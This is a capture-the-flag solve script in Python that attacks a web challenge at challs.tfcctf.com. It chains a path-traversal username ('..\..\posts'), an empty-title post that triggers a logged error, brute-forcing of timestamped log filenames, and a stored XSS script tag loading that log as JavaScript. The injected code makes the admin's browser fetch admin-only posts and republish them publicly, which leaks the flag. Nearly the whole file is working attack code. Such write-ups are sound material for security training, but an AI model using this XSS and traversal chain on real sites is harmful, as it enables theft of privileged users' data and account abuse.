# Solve:
# 1. Register user A
# 2. Login
# 3. Create post with empty title and JS payload in content
# 4. Create path traversal username to /posts
# 5. Login as path traversal user
# 6. Report username's posts
# 7. Admin is redirected to /posts
# 8. Error occurs when trying to load post with empty title
# 9. Find error log file in /static/logs
# 10. Login as user A
# 11. Delete all posts
# 12. Create post with empty title and XSS payload (with script src to error log) in content
# 13. Login as path traversal user
# 14. Report username's posts
# 15. Admin is redirected to /posts
# 16. Error occurs when trying to load post with empty title
# 17. XSS triggers by loading error log file as script src
# 18. XSS creates post with flag as content and marks it non-hidden
# 19. Exfiltrate flag from post via /posts/view/admin
# Profit.

import requests, sys, random, string

url = 'http://challs.tfcctf.com:32720/'
#url = 'http://localhost:1337/'
## Username is used to make JS parse properly
USERNAME = ".charAt"
print("USERNAME:", USERNAME)
PASSWORD = "brunnerne"

# Register A
s = requests.session()
r = s.post(url + 'api/register', json={'username': USERNAME, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to register")
    #sys.exit(1)
print(r.json())
# Login A
r = s.post(url + 'api/login', json={'username': USERNAME, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login")
    sys.exit(1)
print(r.json())

## Wipe existing posts
print("Wiping posts for user A")
r = s.delete(url + 'api/posts/all')
if r.status_code != 200:
    print("Failed to wipe posts")
    sys.exit(1)
print(r.json())

# Create JS post
## Empty title to trigger exception for admin at /posts
## Payload creates a non-hidden post with flag for us to exfiltrate later.
JS_PAYLOAD = """();
fetch("http://localhost:1337/posts/view/admin").then((response) =>
    response.text().then((resp) => {
        const data = { title: "Free flag", content: resp, hidden: false };

        fetch(`/api/posts`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data),
        });
    })
);
"""
r = s.post(url + 'api/posts', json={'content': JS_PAYLOAD, 'hidden': False})

if r.status_code != 200:
    print("Failed to create post")
    sys.exit(1)
print(r.json())

# Create User with path traversal
USERNAME_PAYLOAD = "..\\..\\..\\..\\..\\..\\posts"
r = s.post(url + 'api/register', json={'username': USERNAME_PAYLOAD, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to register user with path traversal")
    #sys.exit(1)
print(r.json())

# Login as path traversal user
r = s.post(url + 'api/login', json={'username': USERNAME_PAYLOAD, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login as path traversal user")
    sys.exit(1)
print(r.json())

# Report user
r = s.post(url + 'api/report')

if r.status_code != 200:
    print("Failed to report user")
    sys.exit(1)
print(r.json())

# Wait for admin to navigate and find error log
import time
time.sleep(50)
import datetime
error_date = datetime.datetime.now() - datetime.timedelta(hours=2)
for i in range(-50, 50):
  test_date = error_date + datetime.timedelta(seconds=i)
  test_date = test_date.strftime('%Y-%m-%d %H:%M:%S')
  print("ERROR DATE:", test_date)
  log_url = f"{url}static/logs/{test_date}.txt"
  ## Check if log exists
  r = s.get(log_url)
  if r.status_code == 200:
    print("Found error log")
    print(log_url)
    break
else:
    print("Failed to find error log")
    sys.exit(1)

# Login as A
r = s.post(url + 'api/login', json={'username': USERNAME, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login as A")
    sys.exit(1)
print(r.json())

# Delete all posts
r = s.delete(url + 'api/posts/all')

if r.status_code != 200:
    print("Failed to delete all posts")
    sys.exit(1)
print(r.json())

# Create XSS post
## Empty title to trigger exception for admin at /posts
XSS_PAYLOAD = f"""
<script src="{log_url}"></script>
""".strip()
r = s.post(url + 'api/posts', json={'content': XSS_PAYLOAD, 'hidden': False})

if r.status_code != 200:
    print("Failed to create post")
    sys.exit(1)
print(r.json())

# Login as path traversal user
r = s.post(url + 'api/login', json={'username': USERNAME_PAYLOAD, 'password': PASSWORD})

if r.status_code != 200:
    print("Failed to login as path traversal user")
    sys.exit(1)
print(r.json())

# Report user
r = s.post(url + 'api/report')

if r.status_code != 200:
    print("Failed to report user")
    sys.exit(1)
print(r.json())

# Wait 50 seconds for XSS to trigger
time.sleep(50)

# Profit
## Get flag from public admin post
r = s.get(url + 'posts/view/admin')

if r.status_code != 200:
    print("Failed to get flag")
    sys.exit(1)
print(r.text)

# Print flag with regex TFCCTF{.+}
import re
print("FLAG:", re.findall(r'TFCCTF{.+}', r.text)[0])